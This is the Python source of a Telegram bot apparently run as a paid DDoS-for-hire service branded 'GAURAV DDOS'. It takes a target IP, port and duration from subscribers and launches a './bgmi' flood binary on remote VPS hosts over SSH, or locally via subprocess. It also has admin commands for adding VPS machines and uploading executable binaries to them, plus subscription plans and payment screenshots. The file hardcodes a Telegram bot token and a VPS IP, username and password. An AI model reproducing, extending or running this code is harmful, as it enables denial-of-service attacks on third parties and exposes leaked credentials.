import telebot

import subprocess

import datetime

import os

import time

import hashlib

import requests

from io import BytesIO

from PIL import Image

from telebot import types

import threading

import paramiko  # For SSH and SCP connections



# Bot Setup

API_TOKEN = '7890188377:AAHLdCvj8MsKk-65mEOvad6dXakU38YYk3s'

ADMIN_ID = ["6539807903"]

USER_FILE = "users.txt"

ADMIN_FILE = "admins.txt"

LOG_FILE = "log.txt"

FREE_USER_FILE = "free_users.txt"



vps_list = {

    "DON'T USE": {"ip": "95.179.144.119", "username": "master_dbkhrhttuq", "password": "e65cNTPtKtum"},

}



user_attack_details = {}



# Initialize the bot

bot = telebot.TeleBot(API_TOKEN)



# Define the custom keyboard with buttons

keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True)

keyboard.row(

    telebot.types.KeyboardButton("ATTACK"),

    telebot.types.KeyboardButton("PAY"),

    telebot.types.KeyboardButton("PLAN")

)

keyboard.add(telebot.types.KeyboardButton("HELP"))







#GAURAV BHAI#

user_screenshot_status = {}

user_screenshot_hash = {}



REFERENCE_IMAGE_URL = 'http://example.com/path/to/your/image.jpg'

# Function to get the hash of an image

def get_image_hash(image_url):

    try:

        # Download the image

        response = requests.get(image_url)

        img = Image.open(BytesIO(response.content))

        

        # Convert the image to a format suitable for hashing (e.g., grayscale)

        img = img.convert('RGB')

        

        # Create a hash of the image (e.g., using MD5)

        img_hash = hashlib.md5(img.tobytes()).hexdigest()

        return img_hash

    except Exception as e:

        print(f"Error fetching or processing image: {e}")

        return None



# Store the hash of the reference image when the bot starts

REFERENCE_IMAGE_HASH = get_image_hash(REFERENCE_IMAGE_URL)





# Load allowed admin IDs from the file

def read_admins():

    return read_file(ADMIN_FILE)



# Helper function to read a file into a list

def read_file(file_path):

    try:

        with open(file_path, "r") as file:

            return file.read().splitlines()

    except FileNotFoundError:

        return []



# Load allowed user IDs from the file

allowed_user_ids = read_file(USER_FILE)



# ------------------ Logging Functions ------------------



def log_command(user_id, target, port, time):

    try:

        user_info = bot.get_chat(user_id)

        username = f"@{user_info.username}" if user_info.username else f"UserID: {user_id}"

    except Exception as e:

        username = f"UserID: {user_id}"

    

    with open(LOG_FILE, "a") as file:

        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")



def record_command_logs(user_id, command, target=None, port=None, time=None):

    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"

    if target: log_entry += f" | Target: {target}"

    if port: log_entry += f" | Port: {port}"

    if time: log_entry += f" | Time: {time}"

    

    with open(LOG_FILE, "a") as file:

        file.write(log_entry + "\n")



# ------------------ Approval and Expiry Management ------------------



def set_approval_expiry_date(user_id, duration, time_unit):

    # Handle invalid time_unit gracefully by setting a default expiry date of now if invalid

    time_units = {

        'hour': datetime.timedelta(hours=duration),

        'day': datetime.timedelta(days=duration),

        'week': datetime.timedelta(weeks=duration),

        'month': datetime.timedelta(days=30*duration)  # Approximation of 1 month = 30 days

    }



    # Get the timedelta for the given time_unit, default to timedelta(0) if invalid

    expiry_date = datetime.datetime.now() + time_units.get(time_unit, datetime.timedelta())

    

    # Assuming `user_approval_expiry` is a global dictionary

    user_approval_expiry[user_id] = expiry_date

    return expiry_date



# ------------------ Attack and Response Functions ------------------



attack_in_progress = False

# Define the function to start the attack

def start_attack_reply(message, target, port, duration):

    username = message.from_user.username or message.from_user.first_name

    

    # Initial message informing the user the attack has started

    response = f" 🅰🆃🆃🅰🅲🅺 🅻🅰🆄🅽🅲🅷🅴🅳\n\n🆃🅰🆁🅶🅴🆃: {target}\n🅿🅾🆁🆃: {port}\n🅳🆄🆁🅰🆃🅾🅸🅽: {duration} Seconds"

    attack_message = bot.reply_to(message, response)



    # Function to run the countdown

    def countdown():

        nonlocal duration

        time.sleep(duration)  # Wait for the specified duration



        # After the countdown finishes, send a final message

        # Continue the countdown logic

        bot.edit_message_text(f"{response}\n\n **BGMI KI CHUDAYI KHATAM**.\n😂😂😂😂", attack_message.chat.id, attack_message.message_id)



    # Start the countdown in a separate thread

    threading.Thread(target=countdown).start()



    # Start the actual attack using subprocess

    subprocess.run(f"./bgmi {target} {port} {duration} 1800", shell=True)

    

    

    

    #---------------+++++++++COMMANDS FUNCTION+++++++++---------------#

    

@bot.message_handler(commands=['start'])

def send_welcome(message):

    user_first_name = message.from_user.first_name

    welcome_text = f'''🔥 𝗛𝗘𝗟𝗟𝗢 {user_first_name.upper()}! 🔥

    

    🌐 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝘁𝗼 **GAURAV DDOS**! 💥

    

    💻 **𝗣𝗼𝘄𝗲𝗿𝗳𝘂𝗹 𝗱𝗲𝗻𝗶𝗮𝗹 𝗼𝗳 𝘀𝗲𝗿𝘃𝗶𝗰𝗲 𝘁𝗼𝗼𝗹𝘀** 𝗮𝗿𝗲 𝗷𝘂𝘀𝘁 𝗮 𝗰𝗹𝗶𝗰𝗸 𝗮𝘄𝗮𝘆! 💣

    

    ⚠️ **𝗡𝗢𝗧𝗘**: 𝗧𝗵𝗲 𝗯𝗼𝘁 𝗶𝘀 𝗼𝗻𝗹𝘆 𝗮𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 𝗳𝗼𝗿 **𝗔𝗨𝗧𝗛𝗢𝗥𝗜𝗭𝗘𝗗 𝗨𝗦𝗘𝗥𝗦**! 🛑



    💥 **𝗘𝗻𝗷𝗼𝘆 𝘁𝗵𝗲 𝗽𝗼𝗿𝘁𝗮𝗹 𝗼𝗳 𝗽𝗼𝗪𝗘𝗥!** ⚡'''

    

    bot.send_message(message.chat.id, welcome_text, reply_markup=keyboard)   

    

@bot.message_handler(commands=['message'])

def broadcast_message(message):

    user_id = str(message.chat.id)

    

    # Check if the user is an admin

    if user_id in ADMIN_ID:

        # Split the message to get the broadcast content

        command = message.text.split(maxsplit=1)

        

        if len(command) > 1:

            broadcast_content = command[1]

            

            # Load the allowed users from the file

            allowed_user_ids = read_file(USER_FILE)

            

            # Send the broadcast message to all users

            for user in allowed_user_ids:

                try:

                    bot.send_message(user, broadcast_content)

                except Exception as e:

                    print(f"Error sending message to {user}: {e}")

            

            response = "✅ Broadcast message sent successfully."

        else:

            response = "❌ No message provided. Please specify the content you want to broadcast."

    else:

        response = "❌ You are not authorized to use this command."

    

    bot.reply_to(message, response)          

    

@bot.message_handler(commands=['admin'])

def add_admin(message):

    user_id = str(message.chat.id)

    

    # Check if the sender is an existing admin

    if user_id in ADMIN_ID:

        command = message.text.split()

        

        if len(command) == 2:

            new_admin_id = command[1]

            

            if new_admin_id not in ADMIN_ID:

                ADMIN_ID.append(new_admin_id)  # Add new admin ID to the list of admins

                with open("admins.txt", "a") as file:

                    file.write(f"{new_admin_id}\n")  # Save the new admin ID to the file

                response = f"✅ {new_admin_id} has been successfully added as an admin."

            else:

                response = f"❌ {new_admin_id} is already an admin."

        else:

            response = "❌ Invalid format. Use: /admin <user_id>"

    else:

        response = "❌ You are not authorized to use this command."

    

    bot.reply_to(message, response)

    

@bot.message_handler(commands=['removeadmin'])

def remove_admin(message):

    user_id = str(message.chat.id)

    

    # Check if the sender is an existing admin

    if user_id in ADMIN_ID:

        command = message.text.split()

        

        if len(command) == 2:

            admin_to_remove_id = command[1]

            

            if admin_to_remove_id in ADMIN_ID:

                ADMIN_ID.remove(admin_to_remove_id)  # Remove admin ID from the list of admins

                with open("admins.txt", "w") as file:

                    for admin in ADMIN_ID:

                        file.write(f"{admin}\n")  # Save the updated admin list to the file

                response = f"✅ {admin_to_remove_id} has been successfully removed as an admin."

            else:

                response = f"❌ {admin_to_remove_id} is not an admin."

        else:

            response = "❌ Invalid format. Use: /removeadmin <user_id>"

    else:

        response = "❌ You are not authorized to use this command."

    

    bot.reply_to(message, response)   





@bot.message_handler(commands=['addvps'])

def add_vps(message):

    user_id = str(message.chat.id)

    

    # Check if the user is an admin

    if user_id in ADMIN_ID:

        command = message.text.split()

        

        if len(command) == 5:

            vps_name, ip, username, password = command[1], command[2], command[3], command[4]

            

            # Add the new VPS to the vps_list

            vps_list[vps_name] = {"ip": ip, "username": username, "password": password}

            

            # Send confirmation message

            bot.reply_to(message, f"✅ VPS '{vps_name}' added successfully!\nIP: {ip}\nUsername: {username}\nPassword: {password}")

        else:

            bot.reply_to(message, "❌ Invalid format. Use: /addvps <VPS Name> <IP> <Username> <Password>")

    else:

        bot.reply_to(message, "❌ You are not authorized to use this command.")

        

        

@bot.message_handler(commands=['vpsremove'])

def remove_vps(message):

    user_id = str(message.chat.id)

    

    # Check if the user is an admin

    if user_id not in ADMIN_ID:

        bot.reply_to(message, "❌ You are not authorized to use this command.")

        return

    

    command = message.text.split()

    

    # Check if the command has the correct format

    if len(command) != 2:

        bot.reply_to(message, "❌ Invalid format. Use: /vpsremove <VPS Name>")

        return

    

    vps_name = command[1]

    

    # Check if the VPS exists in the vps_list

    if vps_name in vps_list:

        # Remove the VPS entry

        del vps_list[vps_name]

        bot.reply_to(message, f"✅ VPS '{vps_name}' removed successfully!")

    else:

        bot.reply_to(message, f"❌ VPS '{vps_name}' not found.")        

        

@bot.message_handler(commands=['add'])

def add_user(message):

    user_id = str(message.chat.id)

    if user_id in ADMIN_ID:

        command = message.text.split()

        if len(command) > 2:

            user_to_add, duration_str = command[1], command[2]

            try:

                duration, time_unit = int(duration_str[:-4]), duration_str[-4:].lower()

                if duration <= 0 or time_unit not in ['hour', 'day', 'week', 'month']:

                    raise ValueError

            except ValueError:

                response = "𝚒𝚗𝚟𝚊𝚕𝚒𝚍 𝚏𝚘𝚛𝚖𝚊𝚝𝚎 𝚞𝚜𝚎 𝚝𝚘. 'hour(s)', 'day(s)', 'week(s)', or 'month(s)'."

                bot.reply_to(message, response)

                return

            

            if user_to_add not in allowed_user_ids:

                allowed_user_ids.append(user_to_add)

                with open(USER_FILE, "a") as file:

                    file.write(f"{user_to_add}\n")

                expiry_date = set_approval_expiry_date(user_to_add, duration, time_unit)

                response = f" 🍀𝚞𝚜𝚎𝚛 {user_to_add} 𝚊𝚍𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕. 𝚊𝚌𝚌𝚎𝚜𝚜 𝚎𝚡𝚙𝚒𝚛𝚎 𝚘𝚗  {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}"

            else:

                response = "𝚞𝚜𝚎𝚛 𝚊𝚕𝚛𝚎𝚍𝚢 𝚎𝚡𝚒𝚜𝚝"

        else:

            response = "𝙴𝚡𝚊𝚖𝚙𝚕𝚎 𝚞𝚜𝚎: /add <𝚞𝚜𝚎𝚛 𝚒𝚍> <𝚍𝚞𝚛𝚊𝚝𝚘𝚒𝚗>"

    else:

        response = "❌ 𝚢𝚘𝚞 𝚊𝚛𝚎 𝚗𝚘𝚝 𝚊𝚞𝚝𝚑𝚘𝚛𝚒𝚣𝚎𝚍 𝚘𝚗𝚕𝚢 𝚊𝚍𝚖𝚒𝚗 𝚞𝚜𝚎 @GAURAV_BHAI1."

    bot.reply_to(message, response)



@bot.message_handler(commands=['remove'])

def remove_user(message):

    user_id = str(message.chat.id)  # Get the user ID of the person sending the message

    command = message.text.split()  # Split the command to get the user ID to remove



    if len(command) > 1:  # Check if a user ID is provided

        user_to_remove = command[1]  # Get the user ID to remove

        

        if user_id in ADMIN_ID:  # Check if the person sending the message is an admin

            if user_to_remove in allowed_user_ids:  # Check if the user is in the allowed list

                allowed_user_ids.remove(user_to_remove)  # Remove the user from allowed list

                

                # Remove from the ADMIN_ID list if they are an admin

                if user_to_remove in ADMIN_ID:

                    ADMIN_ID.remove(user_to_remove)  # Remove the user from admin list



                # Save the updated allowed users and admin list back to the files

                try:

                    with open(USER_FILE, "w") as file:

                        for user in allowed_user_ids:

                            file.write(f"{user}\n")

                    

                    with open(ADMIN_FILE, "w") as file:

                        for admin in ADMIN_ID:

                            file.write(f"{admin}\n")



                    response = f"𝚞𝚜𝚎𝚛 {user_to_remove} 𝚛𝚎𝚖𝚘𝚟𝚎𝚍 𝚜𝚞𝚌𝚌𝚎𝚜𝚜𝚏𝚞𝚕𝚕𝚢."

                except Exception as e:

                    response = f"❌ 𝑬𝑹𝑹𝑶𝑹: Could not save the updated list. {str(e)}"

            else:

                response = f"𝚞𝚜𝚎𝚛 {user_to_remove} 𝚗𝚘𝚝 𝚏𝚘𝚞𝚗𝚍 𝚒𝚗 𝚊𝚕𝚕𝚘𝚠𝚎𝚍 𝚞𝚜𝚎𝚛𝚜."

        else:

            response = "❌ 𝚢𝚘𝚞 𝚊𝚛𝚎 𝚗𝚘𝚝 𝚊𝚞𝚝𝚑𝚘𝚛𝚒𝚣𝚎𝚍 𝚘𝚗𝚕𝚢 𝚊𝚍𝚖𝚒𝚗."

    else:

        response = "𝙴𝚡𝚊𝚖𝚙𝚕𝚎 𝚝𝚘 𝚞𝚜𝚎: /remove <𝚞𝚜𝚎𝚛 𝚒𝚍>"

    

    bot.reply_to(message, response)    

    

    

@bot.message_handler(commands=['message'])

def broadcast_message(message):

    user_id = str(message.chat.id)

    

    # Check if the user is an admin

    if user_id in ADMIN_ID:

        # Split the message to get the broadcast content

        command = message.text.split(maxsplit=1)

        

        if len(command) > 1:

            broadcast_content = command[1]

            

            # Load the allowed users from the file

            allowed_user_ids = read_file(USER_FILE)

            

            # Send the broadcast message to all users

            for user in allowed_user_ids:

                try:

                    bot.send_message(user, broadcast_content)

                except Exception as e:

                    print(f"Error sending message to {user}: {e}")

            

            response = "✅ Broadcast message sent successfully."

        else:

            response = "❌ No message provided. Please specify the content you want to broadcast."

    else:

        response = "❌ You are not authorized to use this command."

    

    bot.reply_to(message, response)

    

@bot.message_handler(commands=['alluser'])

def all_user_list(message):

    user_id = str(message.chat.id)

    

    # Check if the user is an admin

    if user_id in ADMIN_ID:

        # Load the allowed users from the file

        allowed_user_ids = read_file(USER_FILE)

        

        if allowed_user_ids:

            # Prepare the list of users with their usernames and IDs

            user_list = []

            for user_id in allowed_user_ids:

                try:

                    user_info = bot.get_chat(user_id)  # Get user info using chat ID

                    username = f"@{user_info.username}" if user_info.username else f"UserID: {user_id}"

                    user_list.append(f"{username} (ID: {user_id})")

                except Exception as e:

                    user_list.append(f"UserID: {user_id} (Username not available)")

            

            # Format the list of users

            response = "✅ List of all approved users:\n\n" + "\n".join(user_list)

        else:

            response = "❌ No approved users found."

    else:

        response = "❌ You are not authorized to use this command."



    bot.reply_to(message, response)





@bot.message_handler(commands=['adminlist'])

def admin_list(message):

    user_id = str(message.chat.id)

    

    # Check if the sender is an existing admin

    if user_id in ADMIN_ID:

        # Get the list of admins from the admins.txt file

        admins = read_file(ADMIN_FILE)

        

        if admins:

            # Create a formatted string of admin list with usernames and IDs

            admin_list_text = "🛡️ **Admin List**:\n\n"

            for admin_id in admins:

                try:

                    admin_info = bot.get_chat(admin_id)  # Get admin info using chat ID

                    username = f"@{admin_info.username}" if admin_info.username else f"UserID: {admin_id}"

                    admin_list_text += f"👑 {username} (ID: {admin_id})\n"

                except Exception as e:

                    admin_list_text += f"👑 UserID: {admin_id} (Username not available)\n"

            

            bot.reply_to(message, admin_list_text)

        else:

            bot.reply_to(message, "❌ There are no admins in the list.")

    else:

        bot.reply_to(message, "❌ You are not authorized to use this command.")    

        

        

import paramiko

from telebot import types



user_file_upload_details = {}



@bot.message_handler(commands=['uploadfile'])

def ask_file_upload(message):

    user_id = str(message.chat.id)

    if user_id not in ADMIN_ID:

        bot.reply_to(message, "❌ You are not authorized to use this command.")

        return



    bot.send_message(user_id, "📤 Please upload the file you want to send to a VPS.")

    bot.register_next_step_handler(message, store_uploaded_file)



def store_uploaded_file(message):

    if message.document is None:

        bot.reply_to(message, "❌ No file uploaded. Please try again.")

        return



    file_id = message.document.file_id

    file_name = message.document.file_name

    file_info = bot.get_file(file_id)

    downloaded_file = bot.download_file(file_info.file_path)



    user_file_upload_details[message.chat.id] = {

        "file_name": file_name,

        "file_data": downloaded_file

    }



    # Show VPS selection buttons

    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)

    for vps_name in vps_list.keys():

        markup.add(types.KeyboardButton(vps_name))



    bot.send_message(message.chat.id, f"✅ File '{file_name}' uploaded.\n\nSelect a VPS to upload to:", reply_markup=markup)



@bot.message_handler(func=lambda message: message.text in vps_list.keys())

def upload_to_selected_vps(message):

    user_id = message.chat.id

    if user_id not in user_file_upload_details:

        return  # No file was uploaded earlier



    vps_name = message.text

    vps_details = vps_list[vps_name]

    file_info = user_file_upload_details[user_id]

    file_name = file_info["file_name"]

    file_data = file_info["file_data"]



    try:

        ssh = paramiko.SSHClient()

        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        ssh.connect(vps_details["ip"], username=vps_details["username"], password=vps_details["password"])

        sftp = ssh.open_sftp()



        remote_path = f"Alone/{file_name}"

        try:

            sftp.stat("Alone")

        except FileNotFoundError:

            sftp.mkdir("Alone")



        with sftp.file(remote_path, 'wb') as remote_file:

            remote_file.write(file_data)



        ssh.exec_command(f"chmod +x {remote_path}")

        sftp.close()

        ssh.close()



        bot.send_message(user_id, f"✅ File '{file_name}' uploaded and made executable on VPS '{vps_name}'.")

    except Exception as e:

        bot.send_message(user_id, f"❌ Upload failed to VPS '{vps_name}'. Error: {str(e)}")



    # Clean up stored file data

    del user_file_upload_details[user_id]

  

        

        #-----------------------BUTTONS FUNCTION ----------------#

        





def check_vps_status(vps_name):

    """Check if a VPS is available for attack"""

    vps = vps_list.get(vps_name)

    if not vps:

        return False, "VPS not found"

    

    try:

        # Check SSH connection

        ssh = paramiko.SSHClient()

        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        ssh.connect(vps['ip'], username=vps['username'], password=vps['password'], timeout=10)

        

        # Check if attack binary exists and is executable

        stdin, stdout, stderr = ssh.exec_command("ls -la Alone/bgmi")

        output = stdout.read().decode().strip()

        

        if "No such file" in output:

            return False, "Attack binary not found"

        

        if "x" not in output.split()[0]:  # Check executable permission

            return False, "Binary not executable"

        

        # Check if attack is already running

        stdin, stdout, stderr = ssh.exec_command("ps aux | grep bgmi | grep -v grep")

        running_processes = stdout.read().decode().strip()

        

        if running_processes:

            return False, "VPS busy with another attack"

            

        ssh.close()

        return True, "Available"

        

    except Exception as e:

        return False, f"Connection error: {str(e)}"



@bot.message_handler(func=lambda message: message.text == 'ATTACK')

def attack_button(message):

    user_id = str(message.chat.id)

    if user_id not in allowed_user_ids and user_id not in ADMIN_ID:

        bot.send_message(user_id, "❌ You are not authorized to use this bot.")

        return



    # Clear any previous attack details

    if user_id in user_attack_details:

        del user_attack_details[user_id]



    bot.send_message(user_id, "Send attack details like this:\n`<IP> <Port> <Duration>`\nExample: `1.1.1.1 80 60`")



@bot.message_handler(func=lambda message: message.text.count(' ') == 2)

def set_attack_details(message):

    user_id = str(message.chat.id)

    try:

        target_ip, port, duration = message.text.split()

        port = int(port)

        duration = int(duration)



        if duration <= 0 or duration > 3600:

            bot.send_message(user_id, "❌ Duration must be between 1 and 3600 seconds.")

            return

        if port <= 0 or port > 65535:

            bot.send_message(user_id, "❌ Port must be between 1 and 65535.")

            return



        user_attack_details[user_id] = {

            "target_ip": target_ip,

            "port": port,

            "duration": duration

        }



        # Show VPS selection menu

        show_vps_menu(user_id)



    except ValueError:

        bot.send_message(user_id, "❌ Invalid format. Use: `<IP> <Port> <Duration>`")



def show_vps_menu(user_id):

    # VPS status check

    status_messages = []

    for vps_name in vps_list:

        is_available, status_msg = check_vps_status(vps_name)

        vps_list[vps_name]['status'] = "🟢 Available" if is_available else "🔴 Busy"

        vps_list[vps_name]['last_checked'] = datetime.datetime.now()

        status_messages.append(f"{vps_name}: {vps_list[vps_name]['status']} - {status_msg}")



    markup = telebot.types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)

    for vps_name in vps_list:

        icon = "🟢" if "Available" in vps_list[vps_name]['status'] else "🔴"

        markup.add(telebot.types.KeyboardButton(f"{icon} {vps_name}"))

    markup.add(telebot.types.KeyboardButton("🔄 Refresh Status"))

    markup.add(telebot.types.KeyboardButton("🔙 Back to Main"))



    bot.send_message(user_id, "VPS Status:\n\n" + "\n".join(status_messages))

    bot.send_message(user_id, "Select a VPS to launch attack:", reply_markup=markup)



@bot.message_handler(func=lambda message: message.text.startswith(("🟢", "🔴")) or 

                                        message.text == "🔄 Refresh Status" or 

                                        message.text == "🔙 Back to Main")

def handle_vps_selection(message):

    user_id = str(message.chat.id)



    # Handle Back button

    if message.text == "🔙 Back to Main":

        bot.send_message(user_id, "Returning to main menu...", reply_markup=keyboard)

        return



    if message.text == "🔄 Refresh Status":

        show_vps_menu(user_id)

        return



    selected_vps = message.text[2:].strip()

    if user_id not in user_attack_details:

        bot.send_message(user_id, "❌ Please set target first using ATTACK button.")

        return



    attack_details = user_attack_details[user_id]

    is_available, status_msg = check_vps_status(selected_vps)

    if not is_available:

        bot.send_message(user_id, f"❌ {selected_vps} is busy: {status_msg}")

        return



    vps_details = vps_list[selected_vps]



    try:

        ssh = paramiko.SSHClient()

        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        ssh.connect(vps_details['ip'], username=vps_details['username'], password=vps_details['password'])



        command = f"cd Alone && nohup ./bgmi {attack_details['target_ip']} {attack_details['port']} {attack_details['duration']} 1800 > /dev/null 2>&1 &"

        ssh.exec_command(command)

        ssh.close()



        msg = f"""

🚀 Attack Launched!



🎯 Target: {attack_details['target_ip']}

🔌 Port: {attack_details['port']}

⏱ Duration: {attack_details['duration']} seconds

🖥 VPS: {selected_vps} ({vps_details['ip']})



⚠️ It will auto-finish after given time.

"""

        # Keep VPS menu active after attack launch

        show_vps_menu(user_id)

        bot.send_message(user_id, msg)



        # Log & notify

        log_command(user_id, attack_details['target_ip'], attack_details['port'], attack_details['duration'])

        

        def notify_attack_finished(user_id, target_ip, duration):

            time.sleep(duration)

            # Still show VPS menu after attack finishes

            show_vps_menu(user_id)

            bot.send_message(user_id, f"✅ Attack on {target_ip} finished after {duration} seconds.")

            

        threading.Thread(target=notify_attack_finished, args=(user_id, attack_details['target_ip'], attack_details['duration'])).start()



    except Exception as e:

        bot.send_message(user_id, f"❌ Error launching attack from {selected_vps}:\n{str(e)}")

        show_vps_menu(user_id)



        

@bot.message_handler(func=lambda message: message.text == 'HELP')

def help_button(message):

    help_text = '''

    Available Commands:



      🍀   /admin <user_id> - Add a new admin

         Usage: /admin <user_id>

         Example: /admin 12345



     😈    /removeadmin <user_id> - Remove a user from the admin list

         Usage: /removeadmin <user_id>

         Example: /removeadmin 12345



     💯    /add <user_id> <duration> - Add a user with an expiry time (e.g., /add <user_id> 1day)

         Usage: /add <user_id> <duration>

         Example: /add 12345 1day



       😂  /remove <user_id> - Remove a user from the allowed list

         Usage: /remove <user_id>

         Example: /remove 12345



        🎈 /setcooldown <time_in_seconds> - Set cooldown for a user (only for admins)

         Usage: /setcooldown <time_in_seconds>

         Example: /setcooldown 60



       👻  /pay - Show payment-related information

         Usage: /pay

         Example: /pay



       😎  /plan - Show the available subscription plans

         Usage: /plan

         Example: /plan



        ♥️ /message <message> - Broadcast a message to all users (admins only)

         Usage: /message <message>

         Example: /message "Important update!"



       💦  ATTACK - Start an attack with the provided parameters (IP, port, duration)

         Usage: ATTACK

         Example: ATTACK 192.168.0.1 80 30



        ❤️‍🩹 /alluser - Check the list of all users

         Usage: /alluser

         Example: /alluser

         

        👌/adminlist -check to all approved admin list

        usage:- /adminlist

        example /adminlist

        

        🖥️ /addvps <VPS Name> <IP> <Username> <Password> - Add a new VPS (admins only)

        Usage: /addvps VPS4 192.168.1.4 user4 pass4

        Example: /addvps VPS4 192.168.1.4 user4 pass4

        

        💙 /vpsremove <vps name > to remove vps 

        usage /vpsremove <vps name>

        example /vpsremove gaurabhai 

       

       🍓 /uploadfile use to all vps binary upload 

    '''

    bot.reply_to(message, help_text)      

    

    

@bot.message_handler(func=lambda message: message.text == 'PAY')

def pay_button(message):

    image_url = "https://files.catbox.moe/kohlku.jpg"  # Replace with a valid image URL (direct image link)

    try:

        bot.send_photo(message.chat.id, image_url)

    except Exception as e:

        bot.reply_to(message, "❌ Error: Could not send the image. Please try again later.")

        print(f"Error sending image: {e}")



# Replace 'admin_chat_id' with the actual chat ID of the admin

admin_chat_id = '6539807903'



@bot.message_handler(content_types=['photo'])

def forward_photo(message):

    try:

        # Get the file_id of the photo sent by the user

        file_id = message.photo[-1].file_id

        

        # Forward the photo to the admin

        bot.forward_message(admin_chat_id, message.chat.id, message.message_id)

        

        # Optionally, you can send a confirmation to the user

        bot.reply_to(message, "✅ Your screenshot has been forwarded to the admin.")

        

    except Exception as e:

        bot.reply_to(message, "❌ Error: Could not forward the photo. Please try again later.")

        print(f"Error forwarding photo: {e}")

            

@bot.message_handler(func=lambda message: message.text == 'PLAN')

def plan_button(message):

    plan_text = '''

    ╔╦╦╦═╦╗╔═╦═╦══╦═╗

    ║║║║╩╣╚╣═╣║║║║║╩╣

    ╚══╩═╩═╩═╩═╩╩╩╩═╝



    𝗔𝗗𝗠𝗜𝗡 -- ( @GAURAV_BHAI1 ) 👑



    🚀 **Available Plans**:

    

    🚀 **𝟭𝐃𝐚𝐲 Plan** 💠 ₹100 ✅

    - Perfect for a quick trial period.

    - Duration: 1 Day

    

    🚀 **𝟯𝐃𝐚𝐲 Plan** 💠 ₹250 ✅

    - Great for short-term usage.

    - Duration: 3 Days

    

    🚀 **𝟳𝐃𝐚𝐲 Plan** 💠 ₹400 ✅

    - Ideal for extended access.

    - Duration: 7 Days

    

    🚀 **𝟯𝟬𝐃𝐚𝐲 Plan** 💠 ₹600 ✅

    - Best value for long-term usage.

    - Duration: 30 Days



    🔥 **Premium Features Included**:

    - Access to **exclusive bot features** and **priority support**.

    - Instant access to **paid files** and **special tools**.



    🖥️ **Hosting Services**:

    - **Private hosting** for your custom bots and projects.

    - Affordable hosting plans available for bots with **24/7 uptime**.

    - Price: Starting at ₹500/month.



    🔒 **Paid Files**:

    - **Exclusive paid files** (e.g., scripts, bot templates, custom tools) available for purchase.

    - Files are regularly updated to keep up with the latest trends and features.

    - Prices for paid files: ₹100 – ₹500 depending on the file.



    📱 **Supported Platforms**:

    - Fully supported on **Android** 📱 and **iPhone** 📲.



    🌐 **Contact us for more details or to get started**.

    '''

    bot.reply_to(message, plan_text)    

    

    

# Start polling the bot

while True:

    try:

        bot.polling(none_stop=True)

    except Exception as e:

        print(f"Error: {e}")

    
